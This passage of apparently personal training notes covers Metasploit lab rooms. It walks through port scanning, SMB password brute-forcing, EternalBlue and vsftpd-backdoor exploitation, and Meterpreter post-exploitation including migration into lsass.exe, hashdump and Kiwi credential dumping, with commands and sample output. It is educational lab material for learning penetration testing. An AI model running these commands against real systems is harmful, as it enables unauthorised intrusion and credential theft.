> - `exploit`/`run` launches; `-z` auto-backgrounds; `check` verifies vulnerability without firing the full payload where supported

---

#### Managing Sessions

**What a session is:** an active communication channel between the attacking machine and a compromised target, registered with a unique numeric ID once a payload connects back successfully.

**Session types:**

- **Meterpreter** — rich, interactive: file system access, privilege escalation, pivoting, and more built in. Most common and most capable
- **Shell** — basic OS command line (`cmd.exe`, `/bin/sh`) — simpler, less feature-rich
- **Protocol-specific** (Metasploit 6.4+) — interactive access to SMB/MSSQL/MySQL/PostgreSQL — specialised, for targeted enumeration

Session management commands are identical regardless of type.

**Backgrounding** — return to `msfconsole` without closing the session:

```
background          # or CTRL+Z
```

The session stays alive in the background — this is what makes managing multiple simultaneous targets possible. Without it, a new module can't be loaded and run without first losing the current session's access.

**Listing active sessions:**

```
sessions
```

Columns:

- **Id** — unique numeric identifier, used with `-i`/`-k`/routing
- **Name** — optional label (`sessions -n <name> -i <id>`)
- **Type** — session type + architecture (`meterpreter x64/windows`)
- **Information** — for Meterpreter: user context + hostname — immediately shows whether access landed as `NT AUTHORITY\SYSTEM` (full) or a regular user
- **Connection** — local/remote IP:port pair

> [!note] Multiple sessions on the same target Running the same exploit twice against one host produces two separate sessions on different local ports (`4444`, `4445`) — exactly why setting a unique `LPORT` per exploit run matters when multiple simultaneous attacks are in flight.

**Interacting with a specific session:**

```
sessions -i 1
```

To switch sessions: background the current one first, then interact with the target one — you can't jump directly between two active sessions.

**Closing sessions:**

```
sessions -k 2        # kill a single session (lowercase)
sessions -K          # kill ALL sessions (uppercase) — use deliberately
```

> [!warning] `-k` vs `-K` — case matters Lowercase kills one specific session by ID; uppercase kills everything active at once. Losing every session simultaneously mid-engagement is a real setback — only use `-K` when actually intending a full cleanup.

**Sessions as the bridge to post-exploitation:** sessions aren't just interactive terminals — many `post/` modules require a `SESSION` parameter pointing at an existing one. Standard workflow:

1. Exploit → open a Meterpreter session
2. Background it
3. `use` a post-exploitation module
4. `set SESSION <id>`
5. Run

Full depth on this pattern covered in the Post-Exploitation room — the key idea here is that sessions are **reusable connections other modules leverage**, not just a one-time interactive shell.

> [!summary] Quick Recap — Managing Sessions
> 
> - `background`/`CTRL+Z` keeps a session alive while returning to `msfconsole` — essential for multi-target engagements
> - `sessions` lists everything active; `Information` column is the fastest way to check privilege level at a glance
> - `sessions -i <id>` to interact, background before switching to a different session
> - `-k <id>` (single) vs `-K` (all) — case-sensitive, and `-K` should be a deliberate choice, not a habit
> - Sessions feed `post/` modules via the `SESSION` parameter — they're reusable infrastructure, not just a terminal

---

> [!summary] Full Metasploit Basics Room — One Glance
> 
> - Framework = centralized exploit/auxiliary/payload/post/encoder/NOP/evasion module library, accessed through `msfconsole`
> - Chain: vulnerability (flaw) → exploit (trigger mechanism) → payload (post-success code) — all three needed for a useful result
> - Payload naming: `_` = single/stageless, `/` = staged — consistent across the whole framework
> - `search` (with `type:`/`platform:`/`cve:`/`name:` filters) → `info` (check Privileged/Check supported/targets) → `use` → `show options` → `set`/`setg` → `exploit`/`run` is the full module workflow
> - Five distinct prompts — mismatched prompt is the #1 troubleshooting step to check first
> - Sessions (`background`, `sessions -i`, `-k`/`-K`) are reusable connections, not one-shot terminals — they're what post-exploitation modules operate through
### Metasploit: Scanning and Exploitation

> [!info] Room context Builds directly on Metasploit: The Basics. Scope: **STRATFORD-WS01** (Windows Server 2008 R2) and **stratford-srv01** (Ubuntu Linux), both production hosts on Stratford Systems' internal network. Full cycle: port/service scanning → Metasploit database (workspaces, host/cred tracking) → vulnerability identification → two full exploitation walkthroughs (EternalBlue on Windows, vsftpd backdoor on Linux) demonstrating the same operational pattern across completely different protocols, OSes, and vulnerability classes.

#### Scanning with Metasploit

**Why scan from inside `msfconsole` instead of just using Nmap directly?** Database integration — results scanned from within the console can flow straight into the Metasploit database, instantly queryable by every other module. Nmap itself can also be run directly from the `msf6 >` prompt — giving both options without leaving the tool.

**Port scanning modules** — `auxiliary/scanner/portscan/`:

```
search portscan
```

Most commonly used: **`auxiliary/scanner/portscan/tcp`** — a full TCP connect scan.

```
use auxiliary/scanner/portscan/tcp
show options
```

Key options:

- **PORTS** — default `1-10000`, scanned sequentially. **Not the same as Nmap's default** (top 1,000 common ports) — Metasploit scans every port in the given range literally
- **THREADS** — parallel connection attempts; `10` is reasonable for lab environments
- **CONCURRENCY** — ports checked simultaneously per host, works alongside `THREADS` to set overall speed

```
set RHOSTS MACHINE_IP
set PORTS 1-1024,3389,8000-8100
set THREADS 10
run
```

Result: five open ports (135, 139, 445, 3389, 8000) — but **open ports alone say nothing about the actual service/version running** — that's the next step.

**Running Nmap directly from `msfconsole`:**

```bash
nmap -sV -O MACHINE_IP
```

Gives version info the basic port scanner can't: e.g. port 445 confirmed as SMB on a Windows host in the `STRATFORD` workgroup, port 8000 running `webfs/1.21`.

> [!warning] `nmap` vs `db_nmap` Plain `nmap` results are displayed but **not stored** in the Metasploit database. Use `db_nmap` (next section) whenever results need to be automatically stored and queryable later.

**Service-specific scanners** — go beyond port discovery into targeted enumeration:

**NetBIOS name scanner:**

```
use auxiliary/scanner/netbios/nbname
set RHOSTS MACHINE_IP
run
```

Confirms the NetBIOS hostname (`STRATFORD-WS01`) and OS.

**HTTP version scanner:**

```
use auxiliary/scanner/http/http_version
set RHOSTS MACHINE_IP
set RPORT 8000
run
```

Confirms `webfs/1.21` — a data point worth remembering for later vulnerability research.

**SMB login brute-force:**

```
use auxiliary/scanner/smb/smb_login
set RHOSTS MACHINE_IP
set SMBUSER penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
set VERBOSE false
run
```

Result: valid creds found (`penny:leo1234`) — exactly the "low-hanging fruit" scanning is meant to surface. Weak credentials remain disturbingly common in real engagements and are often the fastest path to initial access.

> [!warning] Brute-forcing takes time — scope it Large wordlists against SMB login can run long. Target specific/confirmed usernames rather than brute-forcing both username and password space blindly.

**Choosing the right scanner — the repeatable pattern, not a memorised list:**

1. Identify an open port/service from scan results
2. `search type:auxiliary <service_name>` to find relevant scanner modules
3. `info` to understand what the module actually checks
4. Set parameters, `run`

> [!summary] Quick Recap — Scanning
> 
> - `auxiliary/scanner/portscan/tcp` for raw port discovery; `nmap`/`db_nmap` for version/OS fingerprinting on top of that
> - `nmap` displays only; `db_nmap` stores to the database — use `db_nmap` whenever persistence matters
> - Service-specific scanners (NetBIOS, HTTP version, SMB login) go beyond "is it open" to "what exactly is running, and is it weakly secured"
> - The scanner-selection _process_ (search → info → configure → run) is the actual transferable skill, not memorising specific module names

---

#### The Metasploit Database

**The problem it solves:** at real engagement scale (dozens of hosts, each with multiple services), manually tracking IPs/ports/creds in notes doesn't scale. The database (PostgreSQL-backed) stores hosts, services, credentials, and vulnerability data from every scan, queryable directly from `msfconsole`.

**Setup (Kali, own installation — AttackBox has this pre-configured):**

```bash
sudo msfdb init
```

```
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

> [!warning] Kali-specific command `sudo msfdb init` is the correct Kali command — Kali's `msfdb` script handles PostgreSQL user creation internally. Older tutorials suggesting `sudo -u postgres msfdb init` are describing the upstream (non-Kali) approach and won't behave the same way. If `db_status` shows "No connection," start PostgreSQL first (`sudo systemctl start postgresql`), then retry `msfdb init`.

**Workspaces** — isolate data per engagement. All scan results/hosts/services/creds are scoped to whichever workspace is currently active.

```
workspace                    # lists workspaces, * marks active
workspace -a stratford       # create and switch to a new workspace
workspace stratford          # switch to an existing workspace
workspace -d <name>          # delete a workspace and all its data
```

Everything collected from this point forward stays scoped to the active workspace — switching engagements later just means creating a new workspace, with zero data bleed between them.

**Scanning into the database — `db_nmap`:**

```bash
db_nmap -sV -O MACHINE_IP
```

Identical Nmap output to plain `nmap`, but every host/port/service/version/OS detail is **automatically stored** in the current workspace.

**Querying stored data:**

```
hosts                        # every known host
services                     # every open port + service across all hosts
services -S webfs            # filter services by a name substring
creds                        # every credential collected during the engagement
```

The `penny:leo1234` credential from the earlier SMB brute-force, if collected while the DB was active, shows up automatically in `creds` — **collected by one module, instantly available to every other module.** This is the single biggest practical advantage of database integration.

**Using database hosts as `RHOSTS` directly:**

```
use auxiliary/scanner/smb/smb_login
hosts -R                     # populates RHOSTS from every known host
services -S smb -R           # populates RHOSTS from only hosts with a matching service
```

No manual IP re-entry across modules — eliminates transcription errors and saves real time once dealing with more than a couple of targets.

**Importing external scan results:**

```
db_import /path/to/nmap_scan.xml
```

Supports Nmap XML and several other tool formats (Nessus, Qualys, Burp Suite, etc.). `db_export` reverses the process — exporting the database contents for reporting/archival.

> [!summary] Quick Recap — The Database
> 
> - Workspaces isolate engagement data completely — `workspace -a <name>` per new engagement, zero cross-contamination
> - `db_nmap` (not plain `nmap`) is what actually populates the database — use it whenever the results need to persist
> - `hosts`, `services` (with `-S` filter), and `creds` are the three core query commands
> - `hosts -R`/`services -R` auto-populate `RHOSTS` from stored data — no manual re-typing across modules
> - Credentials found by one module become instantly available to every other module through the shared database — this is the actual payoff of the whole system

---

#### Vulnerability Scanning

**The bridge step between scanning and exploitation:** which of the discovered service versions have known, exploitable vulnerabilities? "Low-hanging fruit" — unpatched services, default creds, misconfigurations, known backdoors — is the fastest path to initial access, and Metasploit's scanner modules are built specifically to check for exactly these.

**Core approach: service version strings ARE search queries.** From the earlier `db_nmap` scan:

- Port 445 on STRATFORD-WS01 → `Microsoft Windows Server 2008`
- Port 21 on stratford-srv01 → `vsftpd 2.3.4`
- Port 22 on stratford-srv01 → `OpenSSH 8.2p1`

Each specific version string narrows the search space to a handful of relevant modules almost immediately.

**Example 1 — checking for MS17-010 (EternalBlue) on the Windows host:**

```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS MACHINE_IP
run
```

```
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter...
```

Result recorded automatically:

```
vulns
```

```
MS17-010 SMB RCE Detection    CVE-2017-0143,CVE-2017-0144,CVE-2017-0145,...
```

Structured, CVE-referenced vulnerability data — directly useful for reporting later, with zero manual note-taking.

**Example 2 — checking for anonymous FTP access on the Linux host:**

```
use auxiliary/scanner/ftp/ftp_anonymous
services -S ftp -R          # auto-populate RHOSTS from hosts with an FTP service
run
```

```
[*] Banner: 220 (vsFTPd 2.3.4)
[-] Login failed: anonymous:mozilla@example.com
```

Anonymous login failed (good security practice on the target's part) — but the **banner** confirms `vsFTPd 2.3.4` specifically, a version with a well-known planted backdoor (covered next).

**The vulnerability scanning pattern, every time:**

1. Review service versions from `db_nmap` results (`services`/`services -S`)
2. `search type:auxiliary <service_or_cve>` for relevant scanner modules
3. Load, set `RHOSTS` (manually or via `hosts -R`/`services -R`), `run`
4. Check `vulns` for what got recorded

> [!note] The goal is targeted checks, not exhaustive scanning Not "run every scanner module" — run the ones a specific, already-known version string points directly toward. `vsftpd 2.3.4` or `Microsoft Windows Server 2008` immediately narrows the field to a handful of relevant checks rather than hundreds.

> [!summary] Quick Recap — Vulnerability Scanning
> 
> - Every service version string collected during scanning is itself a search query for the next step
> - `vulns` automatically stores CVE-referenced findings once a scanner confirms them — direct reporting value, no manual logging
> - `services -S <name> -R` chains database filtering directly into `RHOSTS` population — the full scan→identify→target pipeline in three commands
> - Two confirmed findings heading into exploitation: STRATFORD-WS01 vulnerable to MS17-010; stratford-srv01 running `vsftpd 2.3.4` with a known backdoor

---

#### Exploit 1 — EternalBlue (MS17-010)

Targets a buffer overflow in Microsoft's SMBv1 implementation — vulnerability already confirmed in the previous section.

**Step 1 — search and select:**

```
search eternalblue type:exploit
use 0
```

```
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Default payload is a **staged** Meterpreter payload — full-featured interactive session once it lands.

**Step 2 — configure:**

```
set RHOSTS MACHINE_IP
show options
```

Verify `LHOST` matches the actual attacking machine's IP — a common failure point when multiple network interfaces are present. Correct manually if needed: `set LHOST CONNECTION_IP`.

**Step 3 — exploit:**

```
exploit
```

```
[+] Host is likely VULNERABLE to MS17-010!
[+] Connection established for exploitation.
[*] Sending stage (201283 bytes) to MACHINE_IP
[*] Meterpreter session 1 opened
```

**Verifying access and retrieving data:**

```
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > search -f flag.txt
meterpreter > cat c:\\Users\\Administrator\\Desktop\\flag.txt
```

**Landed as `NT AUTHORITY\SYSTEM`** — the highest privilege level on Windows. EternalBlue is a **kernel-level** exploit, so it bypasses normal user privilege boundaries entirely rather than landing at whatever privilege level the exploited service happened to run at.

**Extracting password hashes:**

```
meterpreter > hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

An additional local account (`pirate`) surfaces here — worth noting for post-exploitation/hash cracking later.

**Backgrounding before moving to the second target:**

```
meterpreter > background
```

> [!summary] Quick Recap — EternalBlue
> 
> - Default staged Meterpreter payload requires correct `LHOST` — always verify before running, especially with multiple interfaces
> - Kernel-level exploit → lands at `NT AUTHORITY\SYSTEM` directly, not at some intermediate service-account privilege level
> - `hashdump` after landing is a standard immediate next step — surfaces every local account's NTLM hash for later cracking

---

#### Exploit 2 — vsftpd 2.3.4 Backdoor

> [!warning] Clean up before starting Kill the previous session (`sessions -K`) and stop the previous target before starting this one.

**Background:** in 2011, the vsftpd 2.3.4 **source distribution itself** was compromised — an unknown attacker inserted a backdoor into the download archive. Sending a username ending in `:)` opens a command shell on port `6200`. This is not a buffer overflow or logic flaw — it's **deliberately planted malicious code**, a fundamentally different vulnerability class from EternalBlue.

**Finding and selecting the module:**

```
search vsftpd
use 1
```

```
[*] No payload configured, defaulting to cmd/unix/interact
```

Two immediate differences from EternalBlue:

- **Rank: Excellent** (vs. EternalBlue's Average) — expected to work reliably, no service crash risk
- **Default payload: `cmd/unix/interact`** — a basic interactive shell, not Meterpreter, because the backdoor provides a simple command channel rather than a reflective DLL injection point

> [!warning] Default payload can vary by framework version Some Metasploit releases default this exploit to a network-fetch payload (e.g. `cmd/linux/http/x86/meterpreter_reverse_tcp`) instead — which needs `LHOST` set and is unreliable against this backdoor's constrained channel. **Set the payload explicitly** rather than trusting the default:
> 
> ```
> set PAYLOAD cmd/unix/interact
> ```
> 
> If rejected ("value specified for PAYLOAD is not valid"), fall back to `cmd/unix/reverse_bash` with `set LHOST CONNECTION_IP`.

**Configure and exploit:**

```
set PAYLOAD cmd/unix/interact
set RHOSTS MACHINE_IP
exploit
```

```
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 2 opened
```

**Immediate root access, no privilege escalation needed:**

```
id       → uid=0(root) gid=0(root)
whoami   → root
hostname → stratford-srv01
```

**Key differences observed vs. EternalBlue:**

- Raw shell prompt, no `meterpreter >` prefix — direct target shell interaction, no prompt wrapper at all
- Session type: **Command shell** (session 2), not Meterpreter
- No staged payload downloaded — the backdoor itself _is_ the command execution channel; nothing additional needed after the initial connection

**Side-by-side comparison:**

|Dimension|EternalBlue|vsftpd 2.3.4|
|---|---|---|
|Target service|SMB (445)|FTP (21)|
|Target OS|Windows|Ubuntu Linux|
|Vulnerability type|Buffer overflow (SMBv1)|Planted backdoor in source code|
|Exploit rank|Average|Excellent|
|Default payload|`windows/x64/meterpreter/reverse_tcp` (staged)|`cmd/unix/interact` (single)|
|Session type|Meterpreter|Command shell|
|Privilege level|`NT AUTHORITY\SYSTEM`|`root`|
|Check support|Yes|No|

> [!summary] Quick Recap — vsftpd Backdoor
> 
> - Different vulnerability _class_ entirely — deliberately planted malicious code, not a memory-corruption bug — hence the excellent rank and lack of a `check` option
> - Default payload reliability can vary by Metasploit version for this specific module — always verify/set explicitly rather than trusting the auto-default
> - Root access here is immediate and total — the backdoor itself runs as root, no privilege escalation chain required
> - Command shell sessions (no `meterpreter >` prompt, raw target shell) are a normal, valid session type — not every successful exploit yields Meterpreter

---

> [!summary] Full Scanning and Exploitation Room — One Glance
> 
> - Scan: `auxiliary/scanner/portscan/tcp` for ports → `nmap`/`db_nmap` for version/OS fingerprinting → service-specific scanners (NetBIOS, HTTP version, SMB login) for targeted enumeration
> - Database: workspaces isolate engagements; `db_nmap` (not plain `nmap`) persists results; `hosts`/`services`/`creds` query them; `hosts -R`/`services -R` feed straight into `RHOSTS`
> - Vulnerability ID: every collected version string is a search query — `search type:auxiliary <service>` → confirm with a scanner → `vulns` auto-records CVE-referenced findings
> - Two exploitation walkthroughs proved the same `search → configure → exploit → interact` pattern works identically across a kernel-level buffer overflow (EternalBlue, Windows, Meterpreter, SYSTEM) and a deliberately planted backdoor (vsftpd, Linux, command shell, root) — the operational workflow generalises even when every technical detail underneath differs completely
### Metasploit: Post-Exploitation

> [!info] Room context Continuation from Scanning and Exploitation — session already open on STRATFORD-WS01 via EternalBlue. Covers what Meterpreter actually _is_ and how it works, the different Meterpreter implementations and how to choose between them, the essential command set for situational awareness/file system/networking, and full post-exploitation technique: process migration, privilege escalation, credential harvesting (`hashdump`, Kiwi/Mimikatz), and running `post/` modules through an existing session.

#### What Meterpreter Is

**Meterpreter (Meta-Interpreter)** — an advanced, multi-function payload running on the target as an agent in a command-and-control architecture. Unlike a basic command shell (a pipe to the OS — type `dir`, OS runs `dir`, output returns), Meterpreter is a **purpose-built toolkit running inside the target's memory**, capable of things no sequence of OS commands could achieve alone: process migration, DLL injection, keystroke capture without ever writing a keylogger to disk.

**Three design principles:**

**1. In-memory execution.** Meterpreter runs entirely in RAM — never writes itself to disk as a file. It's injected into an already-running process via **reflective DLL injection**, loading a DLL directly into process memory without registering through the OS's normal module-loading API.

> [!note] Why this matters for detection Traditional AV primarily scans files on disk. Since Meterpreter never creates a file, it bypasses that specific detection mechanism entirely. Confirmed directly: `getpid` after the EternalBlue exploit shows Meterpreter running inside PID 1304 — which `ps` reveals is `spoolsv.exe` (the legitimate Windows Print Spooler service), not any process named "meterpreter." No suspicious process name, no file to scan.

**2. Encrypted communication.** All Meterpreter↔attacker traffic is encrypted — TLS for HTTPS-based variants, AES for TCP-based ones. Network IDS/IPS can't inspect command traffic without decrypting it first. If the target organisation doesn't perform TLS inspection on outbound traffic (many don't), Meterpreter traffic looks like ordinary encrypted web traffic to network monitoring.

**3. Extensibility through loading.** Meterpreter's core is deliberately small; extensions load on demand via `load` (e.g. `load kiwi` for Mimikatz-style credential harvesting) — transferred into the target's memory space at load time, still without touching disk. Minimal initial footprint: only what's actually needed gets transferred.

> [!warning] Honest limitations — Meterpreter is not invisible Modern EDR goes far beyond file scanning:
> 
> - **Behavioural detection** — reflective DLL injection, process migration, and credential dumping are well-known patterns actively flagged by EDR products
> - **Memory scanning** — examines process memory for known malicious signatures, catching payloads that never touched disk
> - **AMSI** — inspects scripts/payloads at runtime on modern Windows, even when memory-resident
> 
> In a well-defended enterprise environment, a default Meterpreter payload will likely be caught. This room's techniques are essential foundations, but real engagements against mature security programs need additional evasion beyond this scope. The Stratford Systems lab has no EDR deployed — deliberately, to allow focus on the commands/techniques without simultaneously fighting detection.

> [!summary] Quick Recap — What Meterpreter Is
> 
> - A memory-resident, purpose-built post-exploitation toolkit — not just a command relay like a basic shell
> - Reflective DLL injection = no file on disk = bypasses signature-based AV specifically (not EDR generally)
> - Encrypted C2 traffic blends with normal web traffic absent TLS inspection
> - Modular loading keeps footprint minimal — only load what's actually needed
> - Real limitation: behavioural detection, memory scanning, and AMSI all catch what disk-scanning alone would miss — Meterpreter is stealthy against one specific detection layer, not all of them

---

#### Meterpreter Flavours and Selection

Meterpreter isn't one binary — it's a family of platform-specific implementations. Choosing correctly is a decision made on every engagement.

**Implementations:**

|Implementation|Platform|Notes|
|---|---|---|
|**Windows Meterpreter**|Windows|Original, most feature-rich — reflective DLL injection, full command set (`migrate`, `hashdump`, `getsystem`, `load kiwi`, keystroke capture, screenshot, webcam). Default and almost always correct choice for Windows targets|
|**Mettle**|Linux, macOS, POSIX|Cross-platform, written in C — core functionality (file system, networking, process management) but no Windows-specific commands (`hashdump`/`getsystem` don't apply)|
|**Java Meterpreter**|Any JVM|For Java application targets (Tomcat, Jenkins) — platform-independent, smaller command set than native implementations|
|**PHP Meterpreter**|PHP web servers|For PHP app exploitation (WordPress, Joomla, custom apps) — most limited variant: no process migration, no native OS integration, but file system access, command execution, reverse shell within the web server's context|
|**Python Meterpreter**|Python-equipped targets|Middle ground between PHP's limited feature set and full native implementations|

**The three-factor decision framework:**

1. **Target operating system** — the primary filter. Windows target → `windows/x64/meterpreter/...`; Linux → `linux/x64/meterpreter/...`. Determines which implementation can even execute
2. **Available components on the target** — the implementation must match what the target can actually run. A PHP web app has a PHP interpreter → PHP Meterpreter; can't inject a Windows DLL into a Linux process, can't run PHP Meterpreter without PHP present
3. **Connection type:**
    - `reverse_tcp` — target connects back on a specified port; most common, most reliable
    - `reverse_http`/`reverse_https` — connects back over HTTP(S); useful when the target firewall only permits outbound web traffic
    - `bind_tcp` — Meterpreter listens on the target, attacker connects in; useful when the target can't initiate outbound connections at all

**Worked examples from the Stratford engagement:**

|Scenario|OS|Components|Connection|Payload|
|---|---|---|---|---|
|EternalBlue on STRATFORD-WS01 (Win7 x64)|Windows|Native DLL injection|No egress restrictions|`windows/x64/meterpreter/reverse_tcp`|
|PHP upload vuln on a Linux server|Linux, but exploit runs _through_ PHP|PHP runtime|Outbound HTTP likely allowed|`php/meterpreter/reverse_tcp`|
|Jenkins (Java) server, HTTPS-only egress|JVM target|Java runtime|Only 443 outbound|`java/meterpreter/reverse_https` (LPORT 443)|

> [!note] The exploited runtime, not just the host OS, can determine the implementation Scenario 2 is instructive: the underlying host is Linux, but because the exploit path runs through PHP specifically, PHP Meterpreter is the correct choice — not native Linux Mettle. Match the implementation to what's actually executing the payload, not just the OS the box happens to run.

**Staged vs. stageless naming** (same convention from the Basics room): `windows/x64/meterpreter/reverse_tcp` (`/` = staged) vs. `windows/x64/meterpreter_reverse_tcp` (`_` = stageless). Staged is the `msfconsole` default and works well; stageless is more common when generating standalone files with `msfvenom` (needs to be fully self-contained with no second download dependency).

**Finding available payloads:**

```
search type:payload meterpreter
```

100+ entries across every platform/connection combination — no need to memorise them. The three-factor framework always narrows to the right choice.

> [!summary] Quick Recap — Meterpreter Flavours
> 
> - Windows Meterpreter is the feature-rich default; Mettle/Java/PHP/Python trade features for platform reach
> - Three-factor framework: target OS → available runtime components → connection type (reverse_tcp default, reverse_https for egress-restricted, bind_tcp for inbound-only)
> - The exploited _runtime_ (e.g. PHP on a Linux host) can matter more than the underlying host OS when picking an implementation
> - Staged (`/`) is the `msfconsole` default; stageless (`_`) matters more for standalone `msfvenom` payloads

---

#### Essential Meterpreter Commands

Organised by function, not alphabetically — `help` at any Meterpreter prompt gives the full alphabetical/categorised list.

**Situational awareness:**

```
sysinfo      # hostname, OS, architecture, domain — the standard first command after landing
getuid       # current privilege level (NT AUTHORITY\SYSTEM = highest on Windows)
getpid       # process ID Meterpreter is currently running inside
ps           # full process list — find migration targets, interesting apps, confirm current context
idletime     # how long the logged-in user has been away from keyboard
```

`ps` output is genuinely useful beyond just listing processes — it reveals `lsass.exe`'s PID (needed later for credential dumping) and which user sessions are active (e.g. a desktop session with `explorer.exe` running under a real username).

**File system operations:**

```
pwd / cd / ls          # standard navigation
cat <file>              # display file contents
search -f *.txt -d C:\Users     # -f = file pattern, -d = limit search scope (omitting -d searches everything — slow)
download <target_path> <local_path>
upload <local_path> <target_path>
```

**Networking:**

```
ifconfig      # target's network interfaces — reveals pivot opportunities on multi-homed hosts
netstat       # active connections — includes the attacker's own Meterpreter connection, plus anything else the target is talking to (databases, file shares, other pivot-worthy systems)
```

**Interacting with the OS directly:**

```
shell                    # drops into a native OS shell (cmd.exe on Windows) — exit to return to meterpreter >
execute -f <cmd> -i      # runs a single command without a full shell; -i makes it interactive
```

`shell` is the fallback for anything Meterpreter has no built-in equivalent for.

> [!note] Command sets differ by implementation Windows Meterpreter includes webcam access, keystroke capture, and screenshot commands that simply don't exist in Mettle (Linux/macOS). Always run `help` fresh in a new session — don't assume feature parity across platforms.

> [!summary] Quick Recap — Essential Commands
> 
> - `sysinfo` → `getuid` → `ps` is the standard opening sequence on any new session
> - `search -f <pattern> -d <path>` scopes file hunting — always set `-d` unless a full-disk search is genuinely intended
> - `netstat` isn't just diagnostic — it's a pivot-target discovery tool
> - `shell`/`execute` bridge the gap whenever a needed OS command has no Meterpreter-native equivalent

---

#### Post-Exploitation Techniques

#### Process Migration

**Moving the Meterpreter session from one process to another.** Three reasons to migrate:

- **Stability** — migrating out of a process that might close (browser, restarting service) into a long-lived one (`explorer.exe`, `svchost.exe`) keeps the session alive
- **Privilege context** — the session inherits whatever privileges its host process runs under; migrating changes effective privilege
- **Capability access** — some operations need a specific process context (e.g. keystroke capture requires being inside a process in the target user's desktop session, like `explorer.exe`)

```
migrate 716
```

```
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```

Migrated from `spoolsv.exe` (1304) to `lsass.exe` (716) — the Local Security Authority Subsystem Service, a common prerequisite for credential dumping since it's where Windows handles authentication.

> [!warning] Migration is one-way and can silently drop privileges Migrating from a SYSTEM process to a process running as a regular user loses SYSTEM privileges immediately. **Always re-check `getuid` after every migration** — the room's example stayed at SYSTEM because `lsass.exe` runs as SYSTEM, but migrating to `explorer.exe` instead (owned by a specific domain user) would have dropped to that user's privilege level.

#### Privilege Escalation with `getsystem`

```
getsystem
```

```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

Attempts several built-in techniques (named pipe impersonation, token duplication) to reach `NT AUTHORITY\SYSTEM`. **Works when the current user already has local admin rights but isn't yet SYSTEM** — a quick built-in win covering the most common scenario. Failure means either target-side protections or insufficient starting privileges — deeper escalation paths are covered in the dedicated Privilege Escalation module.

#### Credential Harvesting with `hashdump`

```
hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ballen:1001:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
```

Format: `username:RID:LM_hash:NTLM_hash:::` — the **NTLM hash** (4th field) is the one typically used for cracking or pass-the-hash.

> [!warning] `hashdump` requires SYSTEM privileges Fails with access denied as a regular user. Standard workflow: `getuid` → not SYSTEM? → try `getsystem` → still not SYSTEM? → `migrate` into a SYSTEM process (`lsass.exe`) → then `hashdump`.

#### Loading Extensions — Kiwi (Mimikatz)

```
load kiwi
```

Brings Mimikatz-style credential harvesting directly into the session. Most useful command: `creds_all`:

```
creds_all
```

```
msv credentials: ballen / STRATFORD / NTLM hash
wdigest credentials: ballen / STRATFORD / Password1   ← cleartext
```

> [!warning] WDigest can leak cleartext passwords, not just hashes On older Windows systems (pre-Windows 8.1/Server 2012 R2 **without** KB2871997), WDigest stores plaintext passwords in memory by default. `creds_all` pulling a literal cleartext password (not just a hash) from a patched-looking system is a critical, directly-reportable finding.

Other Kiwi commands: `lsa_dump_sam` (SAM dump, similar to `hashdump`), `lsa_dump_secrets` (LSA secrets), `golden_ticket_create` (Kerberos attacks — covered in the AD module).

> [!note] `load mimikatz` is now an alias Kiwi replaced the older Mimikatz extension — typing `load mimikatz` auto-redirects to loading Kiwi.

#### Loading Python

```
load python
python_execute "import os; print(os.environ['COMPUTERNAME'])"
```

Full Python interpreter inside the session — useful for custom scripting/data parsing without uploading standalone tooling separately.

#### Running Post-Exploitation Modules

Beyond built-in commands/extensions, the full `post/` module library operates **through an existing session** via the `SESSION` parameter.

**Workflow:**

1. `background` the active Meterpreter session
2. `use` the post module
3. `set SESSION <id>`
4. `run`

```
meterpreter > background
msf6 exploit(...) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > set SESSION 1
msf6 post(windows/gather/enum_domain) > run
```

```
[+] FOUND Domain: STRATFORD
[+] FOUND Domain Controller: STRATFORD-DC (IP: 10.10.14.55)
```

The module used the existing session's access to enumerate the domain and locate the domain controller — no separate exploitation needed, just leveraging access already established.

**Other commonly used post modules:**

- `post/windows/gather/enum_shares` — network shares
- `post/windows/gather/enum_applications` — installed applications
- `post/multi/gather/env` — environment variables
- `post/multi/manage/shell_to_meterpreter` — upgrades a basic shell session to full Meterpreter

Searchable via `search type:post <keyword>`.

> [!summary] Quick Recap — Post-Exploitation Techniques
> 
> - Migration trades stability/capability for a privilege-check obligation — always re-verify `getuid` immediately after
> - `hashdump` needs SYSTEM — the `getuid → getsystem → migrate to lsass.exe → hashdump` chain is the standard fallback sequence
> - Kiwi's `creds_all` can recover actual cleartext passwords via WDigest on unpatched older systems — a more severe finding than a hash alone
> - `post/` modules operate _through_ a backgrounded session via `SESSION` — this is how Meterpreter's built-in commands extend into Metasploit's entire post-exploitation module library

---

> [!summary] Full Post-Exploitation Room — One Glance
> 
> - Meterpreter = memory-resident, modular post-exploitation toolkit — evades disk-based AV specifically, not EDR generally (behavioural detection, memory scanning, AMSI still apply)
> - Choosing an implementation: target OS → available runtime (host OS ≠ always the deciding factor, e.g. PHP apps on Linux) → connection type (reverse_tcp default, reverse_https for restricted egress, bind_tcp for inbound-only)
> - Standard session-opening sequence: `sysinfo` → `getuid` → `ps` → navigate/search file system → check `netstat`/`ifconfig` for pivot opportunities
> - Escalation chain: `getsystem` first (fast, built-in) → `migrate` to a SYSTEM process if needed → re-check `getuid` after every migration, since it can silently drop privilege
> - Credential harvesting: `hashdump` for NTLM hashes (needs SYSTEM), `load kiwi` + `creds_all` for potentially cleartext WDigest passwords on older systems
> - `post/` modules extend everything above through `SESSION` — background first, then the module operates through the existing access rather than requiring a fresh exploit
### Metasploit: Payload Generation

